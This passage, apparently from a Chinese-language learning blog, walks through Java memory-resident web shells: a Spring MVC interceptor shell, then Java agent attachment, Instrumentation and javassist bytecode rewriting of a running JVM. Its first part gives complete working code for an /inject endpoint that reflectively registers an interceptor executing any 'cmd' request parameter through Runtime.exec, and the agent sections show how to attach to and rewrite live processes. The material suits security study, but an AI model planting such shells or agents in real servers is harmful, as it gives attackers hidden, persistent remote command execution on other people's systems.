        </mvc:interceptor>
    </mvc:interceptors>
```
写个controller
```java
package com.shell.controller;
 
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
 
@Controller
public class Spring_Controller {
 
    @ResponseBody
    @RequestMapping("/login")
    public String Login(){
        return "Success!";
    }
}
```
启动服务器，访问/login，回显对应内容.
## 调试
dodispatch
```java
protected void doDispatch(HttpServletRequest request, HttpServletResponse response) throws Exception {
        HttpServletRequest processedRequest = request;
        HandlerExecutionChain mappedHandler = null;
        boolean multipartRequestParsed = false;
        WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);

        try {
            try {
                ModelAndView mv = null;
                Exception dispatchException = null;

                try {
                    processedRequest = this.checkMultipart(request);
```
进入gethandler方法
```java
 protected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
        Iterator var2 = this.handlerMappings.iterator();

        HandlerExecutionChain handler;
        do {
            if (!var2.hasNext()) {
                return null;
            }

            HandlerMapping hm = (HandlerMapping)var2.next();
            if (this.logger.isTraceEnabled()) {
                this.logger.trace("Testing handler map [" + hm + "] in DispatcherServlet with name '" + this.getServletName() + "'");
            }

            handler = hm.getHandler(request);
        } while(handler == null);

        return handler;
    }
```
继续跟
```java
public final HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
        Object handler = this.getHandlerInternal(request);
        if (handler == null) {
            handler = this.getDefaultHandler();
        }

        if (handler == null) {
            return null;
        } else {
            if (handler instanceof String) {
                String handlerName = (String)handler;
                handler = this.getApplicationContext().getBean(handlerName);
            }

            HandlerExecutionChain executionChain = this.getHandlerExecutionChain(handler, request);
            if (CorsUtils.isCorsRequest(request)) {
                CorsConfiguration globalConfig = this.corsConfigSource.getCorsConfiguration(request);
                CorsConfiguration handlerConfig = this.getCorsConfiguration(handler, request);
                CorsConfiguration config = globalConfig != null ? globalConfig.combine(handlerConfig) : handlerConfig;
                executionChain = this.getCorsHandlerExecutionChain(request, executionChain, config);
            }

            return executionChain;
        }
    }
```
来到
```java
protected HandlerExecutionChain getHandlerExecutionChain(Object handler, HttpServletRequest request) {
        HandlerExecutionChain chain = handler instanceof HandlerExecutionChain ? (HandlerExecutionChain)handler : new HandlerExecutionChain(handler);
        String lookupPath = this.urlPathHelper.getLookupPathForRequest(request);
        Iterator var5 = this.adaptedInterceptors.iterator();

        while(var5.hasNext()) {
            HandlerInterceptor interceptor = (HandlerInterceptor)var5.next();
            if (interceptor instanceof MappedInterceptor) {
                MappedInterceptor mappedInterceptor = (MappedInterceptor)interceptor;
                if (mappedInterceptor.matches(lookupPath, this.pathMatcher)) {
                    chain.addInterceptor(mappedInterceptor.getInterceptor());
                }
            } else {
                chain.addInterceptor(interceptor);
            }
        }

        return chain;
    }
```
添加interceptor。

同时
```java
boolean applyPreHandle(HttpServletRequest request, HttpServletResponse response) throws Exception {
		for (int i = 0; i < this.interceptorList.size(); i++) {
			HandlerInterceptor interceptor = this.interceptorList.get(i);
			if (!interceptor.preHandle(request, response, this.handler)) {
				triggerAfterCompletion(request, response, null);
				return false;
			}
			this.interceptorIndex = i;
		}
		return true;
	}
```
会调用preHandle方法，因此选择再preHandle处注入。
## 构造
一种获取上下文的姿势
```java
// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
java.lang.reflect.Field filed = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
// 2. 属性被 private 修饰，所以 setAccessible true
filed.setAccessible(true);
// 3. 获取一个 ApplicationContext 实例
org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();
```
不过LiveBeansView 
是在spring5.3以后引入的，目前用的4可能搞不定。
我们可以通过ApplicationContext上下文来获取AbstractHandlerMapping，进而反射获取adaptedInterceptors属性值
```java
 AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);

        Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        ArrayList<Object> adptedIntercepter = (ArrayList<Object>) field.get(abstractHandlerMapping);
```
反射获取adaptedInterceptors字段，然后获取字段的值。
转型方便add方法调用。
```java
Shell_Interceptor shellInterceptor = new Shell_Interceptor();
        adptedIntercepter.add(shellInterceptor);
```
结合之前的恶意interceptor

```java
package com.shell.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.ArrayList;
@Controller
public class Inject_Shell_Interceptor_Contorller {
    @ResponseBody
    @RequestMapping("/inject")

    public void Inject() throws ClassNotFoundException,NoSuchMethodException,IllegalAccessException,NoSuchFieldException{
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);


        //获取adaptedInterceptor属性值
        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);

        Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        ArrayList<Object> adptedIntercepter = (ArrayList<Object>) field.get(abstractHandlerMapping);

        Shell_Interceptor shellInterceptor = new Shell_Interceptor();
        adptedIntercepter.add(shellInterceptor);


    }
    public class Shell_Interceptor implements HandlerInterceptor {
        @Override
        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
                return true;
            }
            return false;
        }

        @Override
        public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) throws Exception {

        }

        @Override
        public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) throws Exception {

        }
    }
}

```
注册
```java
<mvc:interceptor>
            <mvc:mapping path="/*"/>
            <bean class="com.shell.interceptor.Shell_Interceptor"/>
        </mvc:interceptor>
```
出现了很神奇的现象，每多访问一次，就会多弹出个calc，猜测可能是访问一次，就添加一个恶意interceptor，于是重复叠加，interceptor，多次命令执行，具体没调试，先不分析了，睡觉去了。。

# javaagent🐎
Java Agent就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。
说人话，改变已经编译好的类。

对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的premain-Agent，另一种是JVM启动之后加载的agentmain-Agent。这里我们可以将其理解成一种特殊的Interceptor（拦截器）

![](https://cdn.nlark.com/yuque/0/2023/jpeg/34502958/1686794468090-945f3e94-4389-4940-8744-4446246a4def.jpeg#averageHue=%23f9f9f9&clientId=ufc5ab344-a158-4&from=paste&id=ud34ddd0f&originHeight=322&originWidth=1742&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u71944a90-7e93-4b09-9a60-bbcb4c8a27a&title=)
![](https://cdn.nlark.com/yuque/0/2023/jpeg/34502958/1686794475548-4a686c97-410d-4104-af20-66b85c4215f6.jpeg#averageHue=%23fbfbfb&clientId=ufc5ab344-a158-4&from=paste&id=u1ab75b92&originHeight=622&originWidth=1382&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=udf2276c2-98af-4fde-bc87-b39097e81a0&title=)
## 用法demo
实现一个premain-Agent
```java
import javax.sound.midi.Instrument;
import java.lang.instrument.Instrumentation;

public class Java_Agent_premain {
    public static void premain(String args, Instrumentation inst) throws Exception{
        for(int i=0; i<10; i++){
            System.out.println("调用了premain_Agent");
        }
    }
}

```
一个目标类。
```java
public class Hello {
    public static void main(String[] args) {
        System.out.println("Hello World!");
    }
}
```
### 
打包
在resource/META-INF/的目录下创建MANIFEST.MF用于指定启动类。

```java
Manifest-Version: 1.0
Premain-Class: com.java.premain.agent.Java_Agent_premain


```
配置pom.xml文件
```java
<build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-assembly-plugin</artifactId>
                <version>2.6</version>
                <configuration>
                    <descriptorRefs>
                        <descriptorRef>jar-with-dependencies</descriptorRef>
                    </descriptorRefs>
                    <archive>
                        <manifestFile>
                            src/main/resources/META-INF/MANIFEST.MF
                        </manifestFile>
                    </archive>
                </configuration>
            </plugin>
        </plugins>
    </build>
```
命令行输入
```java
mvn asssmbly:asembly
```
主类设置：
![微信截图_20230615185003.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1686826208413-a29cd967-651b-48ec-a664-46b89f9e4c6d.png#averageHue=%233d4144&clientId=u6af107db-e882-4&from=paste&height=714&id=u703393f1&originHeight=893&originWidth=1288&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50552&status=done&style=none&taskId=uf08f8885-3f3d-4116-ab3d-1c640843edd&title=&width=1030.4)
添加应用程序，添加选项找到隐藏的vm选项。
别轻易改idea.vmoptions，尤其是我用的这种idea，容易出问题，就打不开idea了。
运行主类的时候，会顺带运行我们的
## agentmain
相较于premain-Agent只能在JVM启动前加载，agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。
有关agentmain-Agent的两个类。
### VirtualMachine类
可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。
主要方法：
```java
//允许我们传入一个JVM的PID，然后远程连接到该JVM上
VirtualMachine.attach()
 
//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理
VirtualMachine.loadAgent()
 
//获得当前所有的JVM列表
VirtualMachine.list()
 
//解除与特定JVM的连接
VirtualMachine.detach()
```
### VirtualMachineDescriptor类
用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等
小demo
```java
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.util.List;

public class get_PID {
    public static void main(String[] args) {

        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){

            //遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID
            if(vmd.displayName().equals("get_PID"))
                System.out.println(vmd.id());
        }

    }
}
7020
```
不知道为啥，读不了tools.jar，
maven里面导一下
```java
<dependency>
        <groupId>com.sun</groupId>
        <artifactId>tools</artifactId>
        <version>1.8.0</version>
        <scope>system</scope>
        <systemPath>C:\Program Files\Java\jdk1.8.0_144\lib\tools.jar</systemPath>
    </dependency>
```
这里面systemPath对应的就是你javahome环境变量用的jdk下面的tools.jar换一下就行。
写个类，模拟正在运行的JVM。
```java
import static java.lang.Thread.sleep;

public class Sleep_Hello {
    public static void main(String[] args) throws InterruptedException {
        while (true){
            System.out.println("Hello World!");
            sleep(5000);
        }
    }
}
```
睡眠让其一直运行，又不耗太多内存。
准备一个实现agentmain的类。
```java
package com.enterpr1se.agentmain;
import java.lang.instrument.Instrumentation;

import static java.lang.Thread.sleep;

public class Java_Agent_agentmain {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {
        while (true){
            System.out.println("调用了agentmain-Agent!");
            sleep(3000);
        }
    }
}

```
配置
```java
Manifest-Version: 1.0
Agent-Class: com.enterpr1se.agentmain.Java_Agent_agentmain

```
```java
mvn assembly:asembly
```
注入：
```java
package com.enterpr1se.inject;

import com.sun.media.jfxmedia.events.VideoFrameRateListener;
import com.sun.tools.attach.*;

import javax.naming.directory.AttributeInUseException;
import java.io.IOError;
import java.io.IOException;
import java.util.List;

public class Inject_Agent {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {


        List<VirtualMachineDescriptor> list  = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            if(vmd.displayName().equals("Sleep_Hello")){
                //连接指定JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                //加载agent
                virtualMachine.loadAgent("D:\\java\\JavaAgent\\target\\JavaAgent-1.0-SNAPSHOT-jar-with-dependencies.jar");
                //断开连接
                virtualMachine.detach();
            }
        }


    }
}

```
先启动Sleep_Hello,然后启动这个，运行以后，会一边打印helloworld，一遍打印“调用了agentmain-Agent!”
## instrumention
Instrumentation是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。

instrumention是一个接口：
```java
public interface Instrumentation {
    
    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);
 
    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);
 
    //删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);
 
 
    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;
 
 
 
    //判断一个类是否被修改
    boolean isModifiableClass(Class<?> theClass);
 
    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();
 
    //获取一个对象的大小
    long getObjectSize(Object objectToSize);
 
}
```
### 获取目标JVM已加载类
```java
package com.enterpr1se.agentmain;



import java.lang.instrument.Instrumentation;

public class Java_Agent_agentmain_Instrumentation {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {
        Class [] classes = inst.getAllLoadedClasses();

        for(Class cls : classes){
            System.out.println("------------------------------------------");
            System.out.println("加载类: "+cls.getName());
            System.out.println("是否可被修改: "+inst.isModifiableClass(cls));
        }
    }
}

```
还是老步骤，mf文件修改，一系列操作打下去，注入sleepHello，
列举一些运行结果：
```java
加载类: java.util.LinkedHashMap$LinkedEntrySet
是否可被修改: true
------------------------------------------
加载类: java.util.ServiceLoader$1
是否可被修改: true
------------------------------------------
加载类: java.util.ServiceLoader$LazyIterator
是否可被修改: true
------------------------------------------
加载类: java.util.ServiceLoader
是否可被修改: true
------------------------------------------
加载类: sun.util.locale.provider.SPILocaleProviderAdapter$1
是否可被修改: true
------------------------------------------
加载类: sun.util.locale.provider.JRELocaleProviderAdapter$1
是否可被修改: true
------------------------------------------
加载类: sun.util.locale.provider.LocaleDataMetaInfo
是否可被修改: true
------------------------------------------
加载类: sun.util.locale.provider.TimeZoneNameProviderImpl
是否可被修改: true
------------------------------------------
加载类: sun.util.locale.provider.LocaleProviderAdapter$1
是否可被修改: true
```
太多了。
### transformer
在Instrumentation接口中，我们可以通过addTransformer()来添加一个transformer（转换器），关键属性就是ClassFileTransformer类。
```java
public interface ClassFileTransformer {
byte[]
    transform(  ClassLoader         loader,
                String              className,
                Class<?>            classBeingRedefined,
                ProtectionDomain    protectionDomain,
                byte[]              classfileBuffer)
        throws IllegalClassFormatException;
}
```
ClassFileTransformer接口中只有一个transform()方法，返回值为字节数组，作为转换后的字节码注入到目标JVM中。
在通过 addTransformer 注册一个transformer后，每次定义或者重定义新类都会调用transformer。所谓定义，即是通过ClassLoader.defineClass加载进来的类。而重定义是通过Instrumentation.redefineClasses方法重定义的类。

存在多个转换器的时候，将会产生链式调用。
使用Instrumentation.addTransformer()来加载一个转换器。
转换器的返回结果（transform()方法的返回值）将成为转换后的字节码。
对于没有加载的类，会使用ClassLoader.defineClass()定义它；对于已经加载的类，会使用
ClassLoader.redefineClasses()重新定义，并配合Instrumentation.retransformClasses进行转换。
不可重转换转换器
不可重转换本机转换器
可重转换转换器
可重转换本机转换器。
## 引入javassist
```java
<dependency>
        <groupId>org.javassist</groupId>
        <artifactId>javassist</artifactId>
        <version>3.25.0-GA</version>
    </dependency>
```
做个小demo
```java
package com.enterpr1se.javassist;

import javassist.*;

public class javassistDemo {
    public  static void createPerson() throws Exception{
        //1.获取全局类池
        ClassPool classpool = ClassPool.getDefault();

        //2.开始手搓一个类，先创造一个空类，名字为com.enterpr1se.javassist.Person
        CtClass cc = classpool.makeClass("com.enterpr1se.javassist.Person");
        //创造一个字段，获取变量类型的class，变量名，以及要添加的字段。
        CtField param = new CtField(classpool.get("java.lang.String"),"name",cc);
        //初始化
        param.setModifiers(Modifier.PRIVATE);
        //初始化赋值
        cc.addField(param,CtField.Initializer.constant("xiaoming"));


        //3.生成getter、setter方法
        cc.addMethod(CtNewMethod.setter("setName",param));
        cc.addMethod(CtNewMethod.getter("getName",param));

        //4.添加无参构造函数
        CtConstructor cons = new CtConstructor(new CtClass[]{},cc);
        cons.setBody("{name=\"xiaohong\";}");
        cc.addConstructor(cons);

        //5.添加含参构造函数
        cons = new CtConstructor(new CtClass[]{classpool.get("java.lang.String")},cc);
        cons.setBody("{$0.name = $1;}");//$0表示当前对象，$1表示传入的第一个参数。
        cc.addConstructor(cons);

        //6.创建一个名为printname的无参 无返回值的方法
        CtMethod ctMethod  = new CtMethod(CtClass.voidType,"printname",new CtClass[]{},cc);
        ctMethod.setModifiers(Modifier.PUBLIC);
        ctMethod.setBody("{System.out.println(name);}");
        cc.addMethod(ctMethod);

        //写入目标文件
        cc.writeFile("D:\\java\\JavaAgent\\target\\classes");


    }
    public static void main(String[] args) throws Exception{
        try{
            createPerson();
        }catch (Exception e){
        e.printStackTrace();}
    }

}

```
运行该文件，会生成
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.enterpr1se.javassist;

public class Person {
    private String name = "xiaoming";

    public void setName(String var1) {
        this.name = var1;
    }

    public String getName() {
        return this.name;
    }

    public Person() {
        this.name = "xiaohong";
    }

    public Person(String var1) {
        this.name = var1;
    }

    public void printname() {
        System.out.println(this.name);
    }
}

```
### 分析
Classpool对象是Ctclass的容器，首先创建容器pool，再去pool里面创建好Ctclass，并作一系列修改，之后再从pool容器里面取出。
如果pool里面的类太多，就会自动调用detach()释放内存。
getDefault : 返回默认的ClassPool 是单例模式的，一般通过该方法创建我们的ClassPool；
appendClassPath, insertClassPath : 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；
toClass : 将修改后的CtClass加载至当前线程的上下文类加载器中，CtClass的toClass方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；
get , getCtClass : 根据类路径名获取该类的CtClass对象，用于后续的编辑。
CtClass一些方法：
```java
freeze : 冻结一个类，使其不可修改；
isFrozen : 判断一个类是否已被冻结；
prune : 删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；
defrost : 解冻一个类，使其可以被修改。如果事先知道一个类会被defrost， 则禁止调用 prune 方法；
detach : 将该class从ClassPool中删除；
writeFile : 根据CtClass生成 .class 文件；
toClass : 通过类加载器加载该CtClass。
```
Ctmethod的一些方法：
```java
insertBefore : 在方法的起始位置插入代码；
insterAfter : 在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；
insertAt : 在指定的位置插入代码；
setBody : 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除；
make : 创建一个新的方法。
```
### 调用
反射式
```java
package com.enterpr1se.javassist;

import javassist.*;

import java.lang.reflect.Method;

public class javassistDemo {
    public  static void createPerson() throws Exception{
        //1.获取全局类池
        ClassPool classpool = ClassPool.getDefault();

        //2.开始手搓一个类，先创造一个空类，名字为com.enterpr1se.javassist.Person
        CtClass cc = classpool.makeClass("com.enterpr1se.javassist.Person");
        //创造一个字段，获取变量类型的class，变量名，以及要添加的字段。
        CtField param = new CtField(classpool.get("java.lang.String"),"name",cc);
        //初始化
        param.setModifiers(Modifier.PRIVATE);
        //初始化赋值
        cc.addField(param,CtField.Initializer.constant("xiaoming"));


        //3.生成getter、setter方法
        cc.addMethod(CtNewMethod.setter("setName",param));
        cc.addMethod(CtNewMethod.getter("getName",param));

        //4.添加无参构造函数
        CtConstructor cons = new CtConstructor(new CtClass[]{},cc);
        cons.setBody("{name=\"xiaohong\";}");
        cc.addConstructor(cons);

        //5.添加含参构造函数
        cons = new CtConstructor(new CtClass[]{classpool.get("java.lang.String")},cc);
        cons.setBody("{$0.name = $1;}");//$0表示当前对象，$1表示传入的第一个参数。
        cc.addConstructor(cons);

        //6.创建一个名为printname的无参 无返回值的方法
        CtMethod ctMethod  = new CtMethod(CtClass.voidType,"printname",new CtClass[]{},cc);
        ctMethod.setModifiers(Modifier.PUBLIC);
        ctMethod.setBody("{System.out.println(name);}");
        cc.addMethod(ctMethod);

        Object person = cc.toClass().newInstance();
        Method setName = person.getClass().getDeclaredMethod("setName",String.class);
        setName.invoke(person,"enterPrise");
        Method printname = person.getClass().getDeclaredMethod("printname");
        printname.invoke(person);



    }
    public static void main(String[] args) throws Exception{
        try{
            createPerson();
        }catch (Exception e){
        e.printStackTrace();}
    }

}

```
改一下代码，
将类池的类toclass加载，然后newInstance()创建实例。
然后通过反射，获取类，获取方法，invoke调用。

获得类也可以使用.class文件路径添加的方法：
```java
package com.enterpr1se.javassist;

import javassist.*;

import java.lang.reflect.Method;

public class javassistDemo {
    public  static void createPerson() throws Exception{
        //1.获取全局类池
        ClassPool classpool = ClassPool.getDefault();

        classpool.appendClassPath("D:\\java\\JavaAgent\\target\\classes\\com\\enterpr1se\\javassist\\Person.class");
        CtClass ctclass = classpool.get("com.enterpr1se.javassist.Person");
        Object person = ctclass.toClass().newInstance();

        Method setName = person.getClass().getDeclaredMethod("setName",String.class);
        setName.invoke(person,"enterpr1se");

        Method printname = person.getClass().getDeclaredMethod("printname",null);
        printname.invoke(person);

    }
    public static void main(String[] args) throws Exception{
        try{
            createPerson();
        }catch (Exception e){
        e.printStackTrace();}
    }

}

```
接口方式：
直接贴师傅的测试，打不出来。
```java
package com.boogipop.javassit;

import javassist.*;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author rickiyang
 * @date 2019-08-06
 * @Desc
 */
public class javassistsDemo {

    /**
     * 创建一个Person 对象
     *
     * @throws Exception
     */
    public static void createPseson() throws Exception {

        ClassPool pool = ClassPool.getDefault();
// 将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬
        pool.appendClassPath("E:\\CTFLearning\\Java\\agentdemo\\");
    //获取Person的class对象
        CtClass ctClass = pool.get("com.boogipop.javassit.Person");
        CtClass ctClassI = pool.get("com.boogipop.javassit.PersonI");
        // 使代码生成的类，实现 PersonI 接口
        ctClass.setInterfaces(new CtClass[]{ctClassI});
        PersonI person = (PersonI) ctClass.toClass().newInstance();
        person.setName("阿良良木历");
        person.printName();

    }

    public static void main(String[] args) {
        try {
            createPseson();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
修改目标JVM字节码
准备一个agentmain方法
```java
package com.enterpr1se.agentmain;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class agentmain_transform {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {
        Class [] classes = inst.getAllLoadedClasses();

        //获取目标JVM加载的全部类
        for(Class cls : classes){
            if (cls.getName().equals("Sleep_Hello")){

                //添加一个transformer到Instrumentation，并重新触发目标类加载
                inst.addTransformer(new Hello_Transformer(),true);
                inst.retransformClasses(cls);
            }
        }
    }
}


```
transformer
```java
package com.enterpr1se.agentmain;

import javassist.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class Hello_Transformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try{
            ClassPool classPool = ClassPool.getDefault();
            if(classBeingRedefined!=null){
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(ccp);}
                CtClass ctClass = classPool.get("Sleep_Hello");
                CtMethod ctMethod = ctClass.getDeclaredMethod("hello");

                String body = "{System.out.println(\"Hacker!\");}";
                ctMethod.setBody(body);
                byte[] bytes = ctClass.toBytecode();
                return bytes;

        }

        catch (Exception e){
            e.printStackTrace();
    }
    return null;}
}

```
```java
Manifest-Version: 1.0
Agent-Class: com.enterpr1se.agentmain.agentmain_transform
Can-Redefine-Classes: true
Can-Retransform-Classes: true



```
打包的mf文件
通过javassist方法，重定义Hello方法。
```java
import static java.lang.Thread.sleep;



public class Sleep_Hello {
    public static void main(String[] args) throws InterruptedException {
        while (true){

            hello();
            sleep(3000);
        }
    }

    public static void hello(){
        System.out.println("Hello World!");
    }
}
```
启动，
```java
package com.enterpr1se.inject;

import com.sun.media.jfxmedia.events.VideoFrameRateListener;
import com.sun.tools.attach.*;

import javax.naming.directory.AttributeInUseException;
import java.io.IOError;
import java.io.IOException;
import java.util.List;

public class Inject_Agent {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {


        List<VirtualMachineDescriptor> list  = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            System.out.println(vmd.displayName());
            if(vmd.displayName().equals("Sleep_Hello")){
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                virtualMachine.loadAgent("D:\\java\\JavaAgent\\target\\JavaAgent-1.0-SNAPSHOT-jar-with-dependencies.jar");
                virtualMachine.detach();
            }
        }


    }
}

```
大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，简单来说就是类重定义功能（Class Redefine），但是有以下局限性：
premain和agentmain两种方式**修改字节码**的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。
类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义Instrumentation#redefineClasses方法，此方法有以下限制：

1. 新类和老类的父类必须相同
2. 新类和老类实现的接口数也要相同，并且是相同的接口
3. 新类和老类访问符必须一致。 新类和老类字段数和字段名要一致
4. 新类和老类新增或删除的方法必须是private static/final修饰的
5. 可以修改方法体

### agent内存马
贴一下调用链
```java
Hello:13, HelloWorldController (com.example.spring.controller)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
doInvoke:205, InvocableHandlerMethod (org.springframework.web.method.support)
invokeForRequest:150, InvocableHandlerMethod (org.springframework.web.method.support)
invokeAndHandle:117, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)
invokeHandlerMethod:895, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)
handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)
handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)
doDispatch:1067, DispatcherServlet (org.springframework.web.servlet)
doService:963, DispatcherServlet (org.springframework.web.servlet)
processRequest:1006, FrameworkServlet (org.springframework.web.servlet)
doGet:898, FrameworkServlet (org.springframework.web.servlet)
service:655, HttpServlet (javax.servlet.http)
service:883, FrameworkServlet (org.springframework.web.servlet)
service:764, HttpServlet (javax.servlet.http)
internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilter:53, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:93, FormContentFilter (org.springframework.web.filter)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)
doFilter:119, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)
doFilter:162, ApplicationFilterChain (org.apache.catalina.core)
invoke:197, StandardWrapperValve (org.apache.catalina.core)
invoke:97, StandardContextValve (org.apache.catalina.core)
invoke:540, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:135, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:78, StandardEngineValve (org.apache.catalina.core)
service:357, CoyoteAdapter (org.apache.catalina.connector)
service:382, Http11Processor (org.apache.coyote.http11)
process:65, AbstractProcessorLight (org.apache.coyote)
